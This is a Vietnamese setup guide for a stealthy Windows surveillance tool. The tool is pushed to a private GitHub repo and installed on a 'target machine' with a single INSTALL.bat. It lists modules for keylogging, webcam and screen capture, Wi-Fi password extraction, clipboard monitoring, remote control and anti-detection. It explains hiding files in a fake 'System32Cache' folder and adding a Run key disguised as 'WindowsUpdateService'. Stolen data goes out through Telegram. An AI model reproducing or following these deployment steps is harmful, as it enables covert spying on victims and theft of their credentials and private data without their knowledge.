# 📖 HƯỚNG DẪN ĐẦY ĐỦ - TỪ A ĐẾN Z

## 🎯 Mục tiêu
Tạo repo GitHub tên **TLe1** (Private) và cài đặt ứng dụng trên máy đích chỉ bằng 1 file `.bat`

---

## 📋 BƯỚC 1: TẠO REPO TRÊN GITHUB

### Cách 1: Tạo thủ công (Đơn giản nhất)
1. Đăng nhập GitHub: https://github.com
2. Click nút **"+"** → **"New repository"**
3. Điền thông tin:
   - **Repository name**: `TLe1`
   - **Visibility**: Chọn **Private** ✅
   - **Không** tích vào "Add a README file"
4. Click **"Create repository"**

### Cách 2: Tự động bằng script (Nhanh hơn)
Chạy file `create_repo.bat` (tôi sẽ tạo cho bạn)

---

## 📋 BƯỚC 2: UPLOAD FILE LÊN GITHUB

### Cách 1: Upload qua Web (Đơn giản)
1. Vào repo vừa tạo: `https://github.com/truongxoantit/TLe1`
2. Click **"Add file"** → **"Upload files"**
3. Kéo thả **TẤT CẢ** file từ thư mục `teleee` vào
4. Click **"Commit changes"**

**Lưu ý:** Phải upload vào thư mục `main/` (tạo thư mục `main` trước nếu chưa có)

### Cách 2: Upload bằng Git (Nhanh)
Chạy file `upload_to_github.bat` (tôi sẽ tạo cho bạn)

---

## 📋 BƯỚC 3: CÀI ĐẶT TRÊN MÁY ĐÍCH

### Chỉ cần 1 bước:
1. Tải file `INSTALL.bat` từ GitHub (Raw)
2. Chạy file đó → **XONG!**

File sẽ tự động:
- ✅ Tải tất cả file từ GitHub Private Repo
- ✅ Cài đặt thư viện Python
- ✅ Ẩn thư mục và file
- ✅ Thêm vào Windows Startup
- ✅ Khởi động ứng dụng ngay

---

## 📁 DANH SÁCH FILE CẦN UPLOAD

Upload **TẤT CẢ** các file này vào thư mục `main/`:

```
main/
├── INSTALL.bat              ← File cài đặt (QUAN TRỌNG!)
├── main_stealth.py
├── screen_recorder.py
├── keylogger.py
├── telegram_sender.py
├── file_manager.py
├── stealth.py
├── hotkey_listener.py
├── internet_checker.py
├── performance_optimizer.py
├── anti_detection.py
├── updater.py
├── data_manager.py
├── clipboard_monitor.py
├── screenshot_capture.py
├── file_collector.py
├── process_monitor.py
├── machine_id.py
├── remote_control.py
├── file_receiver.py
├── wifi_extractor.py
├── webcam_capture.py
├── usb_monitor.py
├── config.py
└── requirements.txt
```

---

## ⚙️ CẤU HÌNH GITHUB TOKEN

File `INSTALL.bat` đã có sẵn token, nhưng nếu muốn đổi:

1. Vào: https://github.com/settings/tokens
2. Click **"Generate new token"** → **"Generate new token (classic)"**
3. Đặt tên: `TLe1 Installer`
4. Chọn quyền: **`repo`** (Full control of private repositories)
5. Click **"Generate token"**
6. Copy token và dán vào file `INSTALL.bat` dòng:
   ```batch
   set "GITHUB_TOKEN=PASTE_TOKEN_HERE"
   ```

---

## ✅ KIỂM TRA SAU KHI CÀI ĐẶT

Sau khi chạy `INSTALL.bat` trên máy đích:

1. **Kiểm tra Telegram**: Sẽ nhận được tin nhắn "MÁY TÍNH ĐÃ KẾT NỐI" với Machine ID
2. **Kiểm tra Windows Startup**: 
   - Mở `regedit` → `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
   - Tìm key `WindowsUpdateService`
3. **Kiểm tra thư mục ẩn**:
   - Mở `%APPDATA%\Microsoft\Windows\System32Cache`
   - (Cần bật "Show hidden files" trong File Explorer)

---

## 🛑 DỪNG ỨNG DỤNG

Nhấn: **Ctrl + Shift + Alt + P**

---

## 🔧 XỬ LÝ LỖI

### Lỗi: "Python not found"
- Cài Python từ: https://www.python.org/downloads/
- Nhớ tích "Add Python to PATH"

### Lỗi: "Failed to download files"
- Kiểm tra GitHub token trong `INSTALL.bat`
- Kiểm tra tên repo: `TLe1` (chính xác)
- Kiểm tra username: `truongxoantit` (chính xác)

### Lỗi: "pip not found"
- Chạy: `python -m ensurepip --upgrade`
- Hoặc cài lại Python với pip

---

## 📝 LƯU Ý QUAN TRỌNG

1. ✅ Repo phải là **Private**
2. ✅ Tên repo phải chính xác: **TLe1**
3. ✅ Tất cả file phải ở trong thư mục **main/**
4. ✅ GitHub token phải có quyền **repo**
5. ✅ Máy đích cần có **Python** và **Internet**

---

## 🎉 HOÀN TẤT!

Sau khi hoàn thành các bước trên, chỉ cần:
1. Chạy `INSTALL.bat` trên máy đích
2. Đợi vài phút
3. Kiểm tra Telegram → Nhận dữ liệu!

**Chúc bạn thành công!** 🚀

